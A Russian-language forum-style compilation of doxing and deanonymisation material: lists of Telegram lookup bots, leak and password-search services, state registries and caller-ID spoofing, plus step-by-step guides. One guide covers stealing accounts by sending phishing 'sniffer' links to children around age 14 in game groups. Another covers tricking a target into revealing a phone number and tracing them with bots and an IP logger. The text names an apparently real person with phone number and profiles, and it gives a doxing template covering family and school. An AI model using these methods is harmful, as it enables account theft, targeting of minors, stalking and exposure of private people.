(А еще они сурсы отказались продавать, гандоны)
Подобный парсер изи написать, но бд лень добавлять (а их дохуище)

Ух, а что же делать, если тебя пытаются сватнуть?
Там есть в настройках ксяоми (на других не чекал), можно отключить маршрутизатор в экстренных случаях. (Чтобы вас машина сбила, а вы адресс сказать не можете) (лучше отрубите всю слежку)
Просто блокните исходящие ответы кроме ip телефонии, а потом юзайте войпы
Впринципе hlr запрос создают за тем, чтобы узнать номер инакив или актив, чтобы потом спокойно фрикать.
 - Методика проста - Оффаете фулл исходники , и все :)
Есть кнш хуйня с openvpn в роутере, но не думаю что вы такие умные) (но это фрикинг)
Есть просто дебилизм - звонят в мвд через скайп или пишут на почту
Хотя я не понимаю как там вообще инфу фильтруют, если такая хуйня канает

В Соц.сетях поставьте максимально конфидециальные настройки и не распространяйте личную инфу, наоборот пытайтесь запутать вектора атаки (ну тут уже для норм людей)
Хотя есть такие примочки как ipp для вк, которому похуй на настройки профиля и он чекает даже удаленки (но это уже совсем другая история)

Как же скрыть свои платёжные реквизиты? 
Ну ты долба... Крч создаешь payeer на вирт номер, потом чел туда кидает бабки, а ты потом выводишь на основу с коммисией (она там маленькая) profit!

Какую OS использовать для хацкерских делишек? С обочкой Tor к примеру тот самый Tails 
Для пентеста советую Кальку
----- dnn bot sites
И такс
Quick Osint (ЖРУТ ЗА СУРСЫ КАК ЗА ПОЧКУ НАХУЙ) - юзают гос сервисы (все в опенсурс на лолзе) чекают утечки т.д
Гб - старичок но уже с обширной бдшкой
utechka.com - (я с этой хуйней прикольнулся, скинул их айпишник тачки в беседу) - появился недавно , парсит по бд
есть еще universal и подобные (тоже в опенсурсе на лолзе)
-----

Так а че у нас по мете?
EXIF , XMP , IPTC 
То что чаще приходится стирать с фоток (по придумывали хуйни, теперь страдаем)
Загуглите сами, полезно будет :)

-----
Кнш я тут не все описал, есть еще много фишек, но их дохуя и мне лень писать.
Сука не давайте эту хуйню стэндофферам, они отбитые нахуй
Вообще думаю это первый и последний мануал, т.к не хочу расскрывать свои фишки, проще паспорта продавать

Это дефолт методики как по мне :)

@eyessofgodbot
@Search_firm_bot
@VipiskaEGRNbot
@mailcat_s_bot
@GetOKbot
@WhoisDomBot
@ShtrafKZBot
@ce_poshuk_bot
@InfoVkUser_bot
@probei_ru_bot
@AntiParkonBot
@OpenDataUABot
@Poiskorbot
@pyth1a_0racle_bot
@getcontact_real_bot
@InfoSearchRobot
@n3fm4xw2rwbot
@All1nBot
@t3_avtootvetchik_bot
@True_NoNameBot
@getfb_bot
@clerksecretbot
@rvdhrve_bot
@StealDetectorBOT
@GNEyeBot
@FindNameVk_bot
@egrul_bot
@QuickOSINT_bot
@ibhld_bot
@BotAvinfo_bot
@maigret_osint_bot
@PasswordSearchBot
@PhoneLeaks_bot
@creationdatebot
@telesint_bot
@tgscanrobot
@clerkinfobot
@ssb_russian_probiv_bot
@SovaAppBot
@eyessofgodbot
@usersbox_bot
@TgAnalyst_bot
@UniversalSearchRobot
@hdhdhdhdhdhdhdhdhd_bot
@holehe_s_bot
@ChatSearchRobot
@visionerobot
@testFon2vk_bot
Как взломать страницу
 
1.Итак начнём с того что вам нужно зайти на сниффер
 2.Найти ссылку какой нибудь игры копатель,Кс го.и сократить её.
 3.Потом найти офишал группу игры, нажать участники и ставите 14 лет, после чего ищите человека с аватаркой той игры либо какой нибудь детской.
 4.И там нужно уже подключать фантазию ну например я всегда пишу так "Привет броу помнишь мы вместе играли?"-Во что? "Вспоминай" и потом когда он говорит игру соглашайтесь!
 5.Вообщем в чём смысл вы кидаете ему сниффер он логинется и пароль с логином у вас

Сайты
Ссылка на 1 сайт: https://fake-game.ru
Аналоги (если сайт сломан) snifman.pw kotfake.ru
Ссылка на сократитель ссылок https://goo.gl
Ссылка на бесплатный сниффер: https://osniffer.ru
Снифман — http://snif-f.ru/
Снифман-http://snifman.pw/w

https://service.nalog.ru/inn.do – сервис определения ИНН физического лица
http://bankrot.fedresurs.ru/ – единый федеральный реестр сведений о банкротстве
http://egrul.nalog.ru/ – сведения, внесенные в Единый Государственный Реестр Юридических Лиц
https://xn--90adear.xn--p1ai/check/driver/ — проверка водительского удостоверения
http://results.audit.gov.ru/ – портал открытых данных Счетной палаты Российской Федерации.
http://sudact.ru/–  ресурс по судебным и нормативным актам, включающим решения судов общей  юрисдикции, арбитражных судов и мировых судей 
http://www.cbr.ru/credit/main.asp –  справочник по кредитным организациям. Сведения ЦБ РФ о банках и кредитных организациях
https://service.nalog.ru/bi.do –  сервис позволяет выяснить, заблокированы или нет банковские счета  конкретного юридического лица или ИП
http://services.fms.gov.ru/ – проверка действительности паспортов и другие сервисы от ФМС России.
http://zakupki.gov.ru/223/dishonest/public/supplier-search.html – реестр недобросовестных поставщиков.
http://fedsfm.ru/documents/terrorists-catalog-portal-act – реестр террористов и экстримистов 
http://www.stroi-baza.ru/forum/index.php?showforum=46 — «черный список» по российским строительным компаниям.
http://xn--90afdbaav0bd1afy6eub5d.xn--p1ai/ – единая база данных решений судов общей юрисдикции РФ.
http://www.centerdolgov.ru/ –  информация о недобросовестных компаниях-должниках России, Украины,  Белоруссии, Казахстана. Поиск компаний, ИНН, стране  и городу.
http://ras.arbitr.ru/ -высший арбитражный суд РФ с картотекой арбитражных дел и банком решения арбитражных судов.
https://rosreestr.ru/wps/portal/cc_information_online – справочная информация по объектам недвижимости от Федеральной службы государственной регистрации
http://www.voditeli.ru/ — база данных о водителях грузовых автомашин, создана с целью выявления «хронических» летунов, алкоголиков, ворья и прочих.
http://www.gcourts.ru/ –  поисковик и одновременно справочник от Yandex по судам общей  юрисдикции.
http://www.e-disclosure.ru/ – сервер раскрытия информации по эмитентам ценных бумаг РФ.
http://www.fssprus.ru/ – картотека арбитражных дел Высшего Арбитражного Суда Российской Федерации
http://rnp.fas.gov.ru/ – Реестр недобросовестных поставщиков ФАС РФ
https://rosreestr.ru/wps/portal/p/cc_present/EGRN_1—  портал услуг Федеральной Службы Государственной Регистрации, Кадастра и  Картографии
http://www.notary.ru/notary/bd.html —  нотариальный портал. Содержит список с координатами всех частных  практикующих нотариусов России и нотариальных палат
http://allchop.ru/ — Единая база всех частных охранных предприятий
http://enotpoiskun.ru/tools/codedecode/ — Расшифровка кодов ИНН, КПП, ОГРН и др. 
http://polis.autoins.ru/ — Проверка полисов ОСАГО по базе Российского союза автостраховщиков
http://www.vinformer.su/ident/vin.php?setLng=ru — Расшифровка VIN транспортных средств 
http://fssprus.ru/ - Федералная служба судебных приставов
http://fssprus.ru/iss/ip - Банк данных исполнительных производств
http://fssprus.ru/iss/ip_search - Реестр розыска по исполнительным производствам
http://fssprus.ru/iss/suspect_info - Лица, находящиеся в розыске по подозрению в совершении преступлений
http://fssprus.ru/gosreestr_jurlic/ - Сведения, содержащиеся в государственном реестре юридических лиц,
осуществляющих деятельность по возврату просроченной задолженности в качестве основного вида деятельности
http://opendata.fssprus.ru/ - открытые данные Федеральной службы судебных приставов
http://sro.gosnadzor.ru/ - Государственный реестр саморегулируемых организаций
http://zakupki.gov.ru/epz/dishonestsupplier/quicksearch/search.html - Сведения из реестра недобросовестных поставщиков
(подрядчиков, исполнителей) и реестра недобросовестных подрядных организаций
https://rosreestr.ru/wps/portal/online_request - Справочная информация по объектам недвижимости
https://rosreestr.ru/wps/portal/p/cc_present/EGRN_1 - Форма запроса сведений ЕГРН
https://rosreestr.ru/wps/portal/p/cc_ib_portal_services/cc_ib_sro_reestrs - Реестры саморегулируемых организаций
https://rosreestr.ru/wps/portal/cc_ib_opendata - Наборы открытых данных Росреестра
https://pkk5.rosreestr.ru/ - Публичная кадастровая карта                                                                                                                                                            


Поиск по USERNAME/NICKNAME:
- https://namechk.com/

Поиск по EMAIL:
- https://haveibeenpwned.com/
- https://hacked-emails.com/
- https://ghostproject.fr/
- https://weleakinfo.com/
- https://pipl.com/
- https://leakedsource.ru/

Поиск по номеру телефона:
- https://phonenumber.to
- https://pipl.com/
  @get_kontakt_bot

Общий поиск по соц. сетям, большой набор разных инструментов для поиска:
- http://osintframework.com/
https://findclone.ru/- Лучшая доступная технология распознавания лиц (документация)

Поиск местоположения базовой станции сотового оператора:
- http://unwiredlabs.com
- http://xinit.ru/bs/

Получение фотографий из соц. сетей из локального района (по геометкам):
- http://sanstv.ru/photomap

https://www.reestr-zalogov.ru/search/index - Реестр уведомлений о залоге движимого имущества
https://мвд.рф/wanted - Внимание, розыск!
https://www.mos.ru/karta-moskvicha/services-proverka-grazhdanina-v-reestre-studentov/ - Проверка гражданина в реестре студентов/ординаторов/аспирантов (держатели карты москвича)
http://esugi.rosim.ru - Реестр федерального имущества Российской Федерации
pd.rkn.gov.ru/operators-registry - Реестр операторов, осуществляющих обработку персональных данных
bankrot.fedresurs.ru - Единый федеральный реестр сведений о банкротстве                                                                                               


Поиск контрагента

https://service.nalog.ru/zd.do - Сведения о юридических лицах, имеющих задолженность по уплате налогов и/или не представляющих налоговую отчетность более года
https://service.nalog.ru/addrfind.do - Адреса, указанные при государственной регистрации в качестве места нахождения несколькими юридическими лицами
https://service.nalog.ru/uwsfind.do - Сведения о юридических лицах и индивидуальных предпринимателях, в отношении которых представлены документы для государственной регистрации
https://service.nalog.ru/disqualified.do - Поиск сведений в реестре дисквалифицированных лиц
https://service.nalog.ru/disfind.do - Юридические лица, в состав исполнительных органов которых входят дисквалифицированные лица
https://service.nalog.ru/svl.do - Сведения о лицах, в отношении которых факт невозможности участия (осуществления руководства) в организации установлен (подтвержден) в судебном порядке
https://service.nalog.ru/mru.do - Сведения о физических лицах, являющихся руководителями или учредителями (участниками) нескольких юридических лиц

https://fedresurs.ru/ - Единый федеральный реестр юридически значимых сведений о фактах деятельности юридических лиц, индивидуальных предпринимателей и иных субъектов экономической деятельности 

http://rkn.gov.ru/mass-communications/reestr/ – реестры Госкомнадзора.
http://www.chinacheckup.com/ – лучший платный ресурс по оперативной и достоверной верификации китайских компаний.
http://www.dnb.com/products.html - модернизированный ресурс одной из лучших в мире компаний в сфере бизнес-информации Dun and Bradstreet.
http://www.imena.ua/blog/ukraine-database/ – 140+ общедоступных электронных баз данных Украины.
http://www.fciit.ru/ – eдиная информационная система нотариата России.
http://gradoteka.ru/ – удобный сервис статистической информации по городам РФ.
http://www.egrul.ru/ - сервис по поиску сведений о компаниях и директорах из государственных реестров юридических лиц России и 150 стран мира.
http://disclosure.skrin.ru - уполномоченное ФСФР (Федеральной службой по финансовым рынкам) на раскрытие информации на рынке ценных бумаг агентство ЗАО “СКРИН”.
http://1prime.ru/docs/product/disclosure.html – уполномоченное ФСФР (Федеральной службой по финансовым рынкам) на раскрытие информации на рынке ценных бумаг агентство ЗАО “Прайм-ТАСС”.
https://www.cbr.ru/ - информация ЦБ по бюро кредитных историй, внесенных в государственный реестр.
http://www.gks.ru/accounting_report – предоставление данных бухгалтерской отчетности по запросам пользователей от Федеральной службы государственной статистики.
http://www.tks.ru/db/ – таможенные онлайн базы данных.
http://tipodop.ru/ - очередной каталог предприятий, организаций в России.
http://www.catalogfactory.org/ – организации России – финансовые результаты, справочные данные и отзывы. Данные в настоящее время доступны по 4,8 млн.организаций.
http://pravo.ru/ – справочно-информационная система, включающая в настоящее время 40 млн. законодательных, нормативных и поднормативных актов Российской Федерации.
http://azstatus.ru/ – информационная база данных, в которой содержится информация обо всех предпринимателях Российской Федерации, а также информация о российских компаниях (юридические лица). Всего в справочнике более 10 миллионов записей.
http://seldon.ru/ – информационно-аналитическая система, значительно упрощающая и систематизирующая работу с закупками.
http://www.reestrtpprf.ru/ – реестр надежных партнеров от системы Торгово-промышленных палат в Российской Федерации.
http://iskr-a.com/ – сообщество безопасников и платформа для информационного взаимодействия в одном флаконе.
http://www.ruscentr.com/ - реестр базовых организаций российской экономики, добросовестных поставщиков и бюджетоэффективных заказчиков (организаций).
https://www.aips-ariadna.com/ – антикриминальная онлайн система учета по России и СНГ. Относится к тому же ценовому сегменту, что и «Контур Фокус» и т.п., и отличается от других систем большим уклоном в судебные и правоохранительные данные. Ориентирована прежде всего на службу безопасности.
http://188.254.71.82/rds_ts_pub/ – единый реестр зарегистрированных деклараций РФ.
http://croinform.ru/index.php?page=index – сервис проверки клиентов, конкурентов, партнеров и контрагентов в режиме реального времени 24/7, в т.ч. со смартфона. Цены вполне человеческие. Сервис знаменитого Кроноса.
http://www.zakupki.gov.ru/epz/main/public/home.html – официальный сайт Российской Федерации для размещения информации о размещении заказов на поставки товаров, выполнение работ, оказание услуг.
http://rostender.info/ – ежедневная рассылка новых тендеров в соответствии с отраслевыми и региональными настройками.
http://pravo.fso.gov.ru/ – государственная система правовой информации. Позволяет быть в курсе всех новых правовых актов. Имеет удобный поисковик.
http://www.bicotender.ru/ - самая полная поисковая система тендеров и закупок по России и странам СНГ.
http://sophist.hse.ru/ – единый архив экономических и социологических данных по российской Федерации от НИУ ВШЭ.
http://www.tenderguru.ru/ – национальный тендерный портал, представляет собой единую базу государственных и коммерческих тендеров с ежедневной рассылкой анонсов по объявленным тендерам.
http://www.moscowbase.ru/ - поддерживаемые в состоянии постоянной актуальности адресно-телефонные базы данных по компаниям Москвы и России. Уникальным продуктом компании являются базы данных новых компаний, появившихся в течение двух последних кварталов. В данные включается вся стандартная информация, предоставляемая платными онлайн базами, плюс актуальные внутренние телефоны и e-mail.
http://www.credinform.ru/ru-RU/globas - информационно-аналитическая система ГЛОБАС – I содержит данные о семи миллионах компаний. Предназначена для комплексной информационной поддержке бизнеса и создания комплексных аналитических отчетов.
http://www.actinfo.ru/ – отраслевой бизнес-справочник предприятий России по их актуальным почтовым адресам и контактным телефонам. Единственный справочник, который включает контактные данные по предприятиям, созданным в предыдущем квартале.
http://www.sudrf.ru/ -государственная автоматизированная система РФ «Правосудие».
http://docs.pravo.ru/ – справочно-правовая система Право.ру. Предоставляет полный доступ к нормативным документам любых субъектов Российской Федерации, а также к судебной практике арбитражных судов и мнениям экспертов любых юридических областей. Ежемесячная плата для работы с полной базой документов составляет 500 руб.
http://www.egrul.com/ – платные и бесплатные сервисы поиска по ЕГРЮЛ, ЕГРИП, ФИО, балансам предприятий и др. параметрам. Одно из лучших соотношений цены и качества.
http://www.fedresurs.ru/ – единый федеральный реестр сведений о фактах деятельности юридических лиц.
http://www.findsmi.ru/ – бесплатный сервис поиска данных по 65 тыс. региональных СМИ.
http://hub.opengovdata.ru/ – хаб, содержащий открытые государственные данные всех уровней, всех направлений. Проект Ивана Бегтина.
http://www.ruward.ru/ – ресурс агрегатор всех рейтингов Рунета. В настоящее время уже содержит 46 рейтингов и более 1000 компаний из web и PR индустрии.
http://www.b2b-energo.ru/firm_dossier/ - информационно-аналитическая и торгово-операционная система рынка продукции, услуг и технологий для электроэнергетики.
http://opengovdata.ru/ – открытые базы данных государственных ресурсов
http://bir.1prime.ru/ – информационно-аналитическая система «Бир-аналитик» позволяет осуществлять поиск данных и проводить комплексный анализ по всем хозяйствующим субъектам России, включая компании, кредитные организации, страховые общества, регионы и города.
http://www.prima-inform.ru/ – прямой доступ к платным и бесплатным информационным ресурсам различных, в т.ч. контролирующих организаций. Позволяет получать документы и сводные отчеты, информацию о российских компаниях, индивидуальных предпринимателях и физических лицах, сведения из контролирующих организаций. Позволяет проверять субъектов на аффилированность и многое другое.
http://www.integrum.ru/ –портал для конкурентной разведки с самым дружественным интерфейсом. Содержит максимум информации, различных баз данных, инструментов мониторинга и аналитики. Позволяет компании в зависимости от ее нужд, размеров и бюджета выбирать режим пользования порталом.
www.spark-interfax.ru – портал обладает необходимой для потребностей конкурентной разведки полнотой баз данных, развитым функционалом, постоянно добавляет новые сервисы.
https://fira.ru/ – молодой быстроразвивающийся проект, располагает полной и оперативной базой данных предприятий, организаций и регионов. Имеет конкурентные цены.
www.skrin.ru – портал информации об эмитентах ценных бумаг. Наряду с обязательной информацией об эмитентах содержит базы обзоров предприятий, отраслей, отчетность по стандартам РБУ, ГААП, ИАС. ЗАО “СКРИН” является организацией, уполномоченной ФСФР.
http://www.magelan.pro/ – портал по тендерам, электронным аукционам и коммерческим закупкам. Включает в себя качественный поисковик по данной предметной сфере.
http://www.kontragent.info/ – ресурс предоставляет информацию о реквизитах контрагентов и реквизитах, соответствующих ведению бизнеса.
http://www.ist-budget.ru/ – веб-сервис по всем тендерам, госзаказам и госзакупкам России. Включает бесплатный поисковик по полной базе тендеров, а также недорогой платный сервис, включающий поиск с использованием расширенных фильтров, по тематическим каталогам. Кроме того, пользователи портала могут получать аналитические отчеты по заказчикам и поставщикам по тендерам. Есть и система прогнозирования возможных победителей тендеров.
http://www.vuve.su/ - портал информации об организациях, предприятиях и компаниях, ведущих свою деятельность в России и на территории СНГ. На сегодняшний день база портала содержит сведения о более чем 1 млн. организаций.
http://www.disclosure.ru/index.shtml - система раскрытия информации на рынке ценных бумаг Российской Федерации. Включает отчетность эмитентов, существенные новости, отраслевые обзоры и анализ тенденций.
http://www.mosstat.ru/index.html – бесплатные и платные онлайн базы данных и сервисы по ЕГРПО и ЕГРЮЛ Москвы и России, а также бухгалтерские балансы с 2005 года по настоящее время. По платным базам самые низкие тарифы в Рунете. Хорошая навигация, удобная оплата, качественная и оперативная работа.
http://www.torg94.ru/ – качественный оперативный и полезный ресурс по госзакупкам, электронным торгам и госзаказам.
http://www.k-agent.ru/ – база данных «Контрагент». Состоит из карточек компаний, связанных с ними документов, списков аффилированных лиц и годовых бухгалтерских отчетов. Документы по компаниям представлены с 2006 г. Цена в месяц 900 руб. Запрашивать данные можно на сколь угодно много компаний.
http://www.is-zakupki.ru/ – информационная система государственных и коммерческих закупок. В системе собрана наиболее полная информация по государственным, муниципальным и коммерческим закупкам по всей территории РФ. Очень удобна в работе, имеет много дополнительных сервисов и, что приятно, абсолютно разумные, доступные даже для малого бизнеса цены.
http://salespring.ru/ – открытая пополняемая база данных деловых контактов предприятий России и СНГ и их сотрудников. Функционирует как своеобразная биржа контактов.
www.multistat.ru – многофункциональный статистический портал. Официальный портал ГМЦ Росстата.
http://sanstv.ru/photomap/ (поиск фото по геометкам в соц. сетях)
Карта движения судов в реальном времени: https://www.marinetraffic.com
Карта движения судов в реальном времени: https://seatracker.ru/ais.php
Карта движения судов: http://shipfinder.co/
Отслеживание самолетов: https://planefinder.net/
Отслеживание самолетов: https://www.radarbox24.com/
Отслеживание самолетов: https://de.flightaware.com/
Отслеживание самолетов: https://www.flightradar24.com

deanon tutorial | #doxpemist
1. У тебя есть теллеграм человека, например: @Zip7337. Ты заходишь в Chrome и
пишешь слово: intext: и вставляешь нужный тебе ник, например intext:zip.prod. С
помощью этого ты можешь найти то, где упомянался его ник, если ничего не нашёл, то не расстраивайся.
2. Ты должен любым способом узнать его номер телефона. Я всегда пишу, что хочу
купить что-нибудь и человек кидает киви, чтобы ты перевёл через ник, но ты напиши
так: я сейчас с банка России деньги переводить буду, кинь номер. Таким образом мы
получили его номер: +77088017441.
3. Всё, ты в шоколаде. Теперь, заходишь в телеграм и пробиваешь id в разных ботах, боты у тебя есть.
Бот тебе выдаст его имя и фамилию, если нет, то делай так:
*заходишь в контакты телефона и добавляешь его номер себе в контакты.
*заходишь в Одноклассники и нажимаешь: друзья - контакты телефона, и всё ты
знаешь его имя и фамилию, в моем случае это: Владислав Титин, Караганда -
https://ok.ru/profile/591482212117.
4. Заходишь в ВК и пишешь имя, фамилию и город, Владислав Титин, Караганда, и
получаешь результат - https://vk.com/vladscam1317
5. Теперь, если у него айди как у этого чела (vladscam1317), тебе надо найти его
настоящее айди. Для этого скопируй ссылку на его любую фотографию, вот:
https://vk.com/photo646256151_457239041, обрежь цифры, после слова photo, то есть
64625651. Если у него нету фотографий, то отправь ссылку на профиль в Telegram bot,
которого я упомянул выше.
6. Ты узнал его айди, 64625651, теперь открываешь сайт чтобы узнать cкрытую
информацию о пользователе ВК, вот сайт view-source:https://vk.com/foaf.php?id=
И после id= пишем цифры из id жертвы; пример
view-source:https://vk.com/foaf.php?id=64625651
ya:created — дата создания профиля;
ya:modified — дата изменения ФИО в профиле (например, в случае
развода/замужества);
ya:lastLoggedIn — дата последнего захода с точностью до секунды.
7. Теперь заходим к нему в друзья и пишешь его фамилию, так как у его родственников
фамилия одинаковая.
8. Если ничего не нашёл, то поищи в его Одноклассниках, может там найдёшь.
9. Может ты хочешь замарочиться над деаноном, ты можешь кинуть iplogger, чтобы
узнать его IP адрес.
10. Чтобы найти его старые страницы, просто впиши его фамилию в поисковике ВК и
ОК, и поставь нужный город, также можешь делать для поиска родственников.
Удачи в деанонах. Статья была написана Провайдером.
*для публикации деанона, держи шаблон:
Деанон на:
Причина деанона:
--------------------------------------------------------
├ Страна:
├ Регион:
├ Город:
--------------------------------------------------------
├ Имя:
├ Фалилия:
 ├ Возраст:
├ Дата рождения:
├ Номер:
├IP:
├Telegram канал:
├Страница ОК:
├Школа:
├Адрес школы:
├Номер телефона школы:
--------------------------------------------------------
├Страница ВК:
-ID Вконтакте:
-Дата создания профиля ВК:
-Изменение ФИО:
-Последний раз был в сети:
--------------------------------------------------------
├Старая страница ВК:
-ID Вконтакте:
-Дата создания профиля ВК:
-Изменение ФИО:
-Последний раз был в сети:
--------------------------------------------------------
├Семья:
                     -Мама-
Имя:
Фамилия:
Дата рождения:
Страница ВК:
-Дата создания профиля ВК:
-Изменение ФИО:
Страница ОК:
Вторая страница ОК:
Третья страница ОК:
                     -Папа-
Имя:
Фамилия:
Дата рождения:
Страница ВК:
-ID Вконтакте:
-Дата создания профиля ВК:
-Изменение ФИО:
-Последний раз был в сети:
Страница ОК:
Вторая страница ОК:
--------------------------------------------------------
Деанон от:

manual выполнен для унпакинга

писал воид

ТЕРМИНЫ

Деанон – (ударение на «о») это срыв покровов анонимности с автора какого-нибудь блога в этих ваших интернетах. Само слово «деанон» является обрезанной версией слова «деанонимизация», которое означает лишение анонимности и раскрытие чьей-либо, ранее скрытой, личности.

Доксинг – это раскрытие в сети идентифицирующей информации о ком-либо, такой как настоящее имя, домашний адрес, место работы, номер телефона, финансовая и другая личная информация. Впоследствии эта информация распространяется без разрешения жертвы.

Начнем с основы intext , как она работает?

intext:internetreference 
intext:internetreference site:telegram.web (сайты могут быть любые , я взял в пример)

1. Дает упоминание в интернете этого никнейма который я указал в примере.
2. Дает упоминание никнейма на указанном сайте.


Боты
├ Quick OSINT — найдет оператора, email, как владелец записан в контактах, базах данных и досках объявлений, аккаунты в соц. сетях и мессенджерах, в каких чатах состоит, документы, адреса и многое другое
├ @clerkinfobot — бот берет данные из приложения getcontact, показывает как записан номер телефона в контактах
├ @dosie_Bot — как и в боте uabaza дает информацио о паспорте только польностью, 3 бесплатные попытки
├ @find_caller_bot — найдет ФИО владельца номера телефона
├ @get_caller_bot — поиск по утечкам персональных данных и записным книгам абонентов, может найти ФИО, дату рождения, e-mail
├ @get_kolesa_bot — найдет объявления на колеса.кз
├ @get_kontakt_bot — найдет как записан номер в контактах, дает результаты что и getcontact
├ @getbank_bot — дает номер карты и полное ФИО клиента банка
├ @GetFb_bot — бот находит Facebook
├ @Getphonetestbot — бот берет данные из приложения getcontact, показывает как записан номер телефона в контактах
├ @info_baza_bot — поиск в базе данных
├ @mailsearchbot — найдет часть пароля
├ @MyGenisBot — найдет имя и фамилию владельца номера
├ @phone_avito_bot — найдет аккаунт на Авито
├ @SafeCallsBot — бесплатные анонимные звонки на любой номер телефона с подменой Caller ID
└ @usersbox_bot — бот найдет аккаунты в ВК у которых в поле номера телефона указан искомый номер

⚙ Ресурсы
├ lampyre.io — программа выполняет поиск аккаунтов, паролей и многих других данных
├ avinfo.guru — проверка телефона владельца авто, иногда нужен VPN
├ fa-fa.kz — найдет ФИО, проверка наличия задолженностей, ИП, и ограничения на выезд
├ getcontact.com — найдет информацию о том как записан номер в контактах
├ globfone.com — бесплатные анонимные звонки на любой номер телефона
├ mirror.bullshit.agency — поиск объявлений по номеру телефона
├ mysmsbox.ru — определяет чей номер, поиск в Instagram, VK, OK, FB, Twitter, поиск объявлений на Авито, Юла, Из рук в руки, а так же найдет аккаунты в мессенджерах
├ nuga.app — найдет Instagram аккаунт, авторизация через Google аккаунт и всего 1 попытка
├ numberway.com — найдет телефонный справочник
├ personlookup.com.au — найдет имя и адрес
├ phoneInfoga.crvx.fr — определят тип номера, дает дорки для номера, определяет город
├ spravnik.com — поиск по городскому номеру телефона, найдет ФИО и адрес
├ spravochnik109.link — поиск по городскому номеру телефона, найдет ФИО и адрес
├ teatmik.ee — поиск в базе организаций, ищет номер в контактах
└ truecaller.com — телефонная книга, найдет имя и оператора телефона

@egrul_bot - Данный бот пробивает Конторы/ИП. По вводу ФИО/Фирмы предоставляет ИНН объекта;
учредителей бизнеса/партнеров и отчет налоговую декларацию. И наоборот: поиск по ИНН выдаст ФИО/конторы.

@get_kontakt_bot- Бот пробивает номер мобильного телефона.
Как записан запрашиваемый контакт в разных телефонных книжках ваших товарищей/подруг/коллег.

@mailsearchbot - По запросу пробива e-mail бот выдает открытый «password» от ящика. Очень огромная/крутая БД

@getfb_bot - По запрашиваемому номеру телефона выдает ссылку на личность в Фэйсбуке.

@buzzim_alerts_bot - Поисковая система по платформе Telegram.
Ищет упоминания ников/каналов в чатах статьях. Присутствует функция оповещения, если что-то где-то всплывёт.8

@AvinfoBot - Бот, который по вводу мобильного телефона выдаст номер машины/марку, а также ссылку и все объявления на Avito.ru.

🔨 Восстановление доступа
├ ICQ — icq.com/password/ru
├ Yahoo — login.yahoo.com/?display=login
├ Steam — help.steampowered.com/ru/wizard/HelpWithLoginInfo
├ Twitter — twitter.com/account/begin_password_reset
├ VK.com — vk.com/restore
├ Facebook — facebook.com/login/identify?ctx=recover
├ Microsoft — account.live.com/acsr
└ Instagram — instagram.com/accounts/password/reset
@killerkill88_bot
@EyeOfAllah_bot узнать айди может показать номер не полный
@poiskorRobot
@UniversalSearchRobot Очень полезный бот




Некоторые полезные инструменты доксинга

www.whois.net

www.pipl.com

www.tineye.com

www.geobytes.com/iplocator.html

www.whitepages.com

www.118.com

www.knowem.com

http://www.spokeo.com/username-search

http://www.zabasearch.com/advanced.php

http://www.ip-address.org/lookup/ip-locator.php

skypegrab.net

http://www.proxyornot.com

https://ssndob.so

whoisology.com

indexeus.com

netcraft.com

shodan.com

intelx.io

http://www.checkusernames.com/

www.myspace.com

www.bebo.com

facebook.com/

instagram.com/

allinurl: //google.com/

www.wink.com

www.123people.com

www.zabasearch.com

http://ip-score.com/checkip

http://iknowwhatyoudownload.com/ru/peer/

http://htmlweb.ru

http://getipintel.net

🌎Поиск пастебина 🌎

🍎Политики🍎

🔘 Инструменты анализа URL 🔘

https://www.virustotal.com/gui/

https://www.urlvoid.com/

https://urlscan.io/

https://exchange.xforce.ibmcloud.com/

https://zulu.zscaler.com/

https://umbrella.cisco.com/

https://www.hybrid-analysis.com/

🔘 Инструменты анализа IP: 🔘

https://exchange.xforce.ibmcloud.com/

https://www.ipvoid.com/

https://umbrella.cisco.com/

🔘 Дополнительную информацию об IP и URL (дата создания, местоположение, организация) можно найти на 🔘

http://cqcounter.com/whois/

http://domainwhitepages.com/

http://whois.domaintools.com/

❤Доксинг:

1: Имя пользователя (псевдоним)

http://namechk.com/

http://knowem.com/

http://www.namecheckr.com/

http://checkusernames.com/

http://usersherlock.com/

https://www.usersearch.org/

⚡️ DOX ANY GMAIL [ИМЯ, ЖИВОЕ МЕСТОПОЛОЖЕНИЕ, ФОТОГРАФИИ, УСТРОЙСТВА, КАЛЕНДАРЬ] (ИСТОЧНИК) ⚡️

Хочу начать с того, что этот инструмент был сделан не мной.

Этот инструмент позволяет получить следующую информацию об учетной записи Gmail:

Имя владельца

Последний раз профиль редактировался

Google ID

Если это аккаунт Hangouts Bot

Активированные сервисы Google (YouTube, Фото, Карты, News360, Hangouts и т. Д.)

Возможный канал на YouTube

Возможные другие имена пользователей

Общедоступные фотографии

Модели телефонов

Прошивки телефонов

Установленное ПО

Обзоры Google Maps

Возможное физическое местонахождение

События из Google Календаря

https://github.com/mxrch/GHunt

Скачать:

https://sql.gg/upload/e4b6aa3c-d20c-493d-ad77-3d6d51381ee6

💚Социальная информация

1. haveibeenpwned.com - проверка просочившихся баз данных

2. emailrep.io - найти сайты, на которых был зарегистрирован аккаунт по электронной почте

3. dehashed.com - проверка почты в просочившихся базах данных

4. @Smart_SearchBot - найдите полное имя, DoB, адрес и номер телефона

5. pwndb2am4tzkvold.onion - поиск в pwndb, также поиск по паролю

6. intelx.io - многофункциональная поисковая система, поиск ведется также и в даркнете

7. @mailsearchbot - поиск по базе, выдает пароль частично

8. @shi_ver_bot - взломанные пароли

9. @info_baza_bot - показать с какой базы просочилась почта, 2 бесплатных сканирования

10. leakedsource.ru - покажите, из какой базы просочилась почта

11. mostwantedhf.info - найти аккаунт в скайпе

12. email2phonenumber (t) - автоматически собирает данные со страниц восстановления аккаунта и находит номер телефона.

13. spiderfoot.net (r) - автоматический поиск с использованием огромного количества методов, инструмент доступен в облаке с регистрацией

14. reversegenie.com - поиск местоположения, первой буквы имени и телефонных номеров

15. searchmy.bio - найти инстаграм-аккаунт с адресом электронной почты в описании

17. leakprobe.
net - найдет ник и источник утечки базы данных.

18.) Получите информацию fb по электронной почте

Создать страницу в фейсбуке

Перейти на страницу диспетчера ролей

(https: //www.facebook.com/ (your-page-id) / settings /? tab = admin_roles или, например,

Введите адрес электронной почты человека, которого вы пытаетесь доказать

Имя и фамилия целей будут показаны под полем, затем просто найдите их на facebook и продолжайте свое путешествие в доксинг.

💙Архивы

https://archive.org/index.php

https://www.archive-it.org/

http://aad.archives.gov/aad/series-list.jsp?cat=GS29

❤Социальные сети

http://www.yasni.com/

http://socialmention.com/

http://www.whostalkin.com/

http://www.linkedin.com/

http://www.formspring.me/

http://foursquare.com/

https://about.me/

https://profiles.google.com/

http://blogger.com

https://twitter.com/

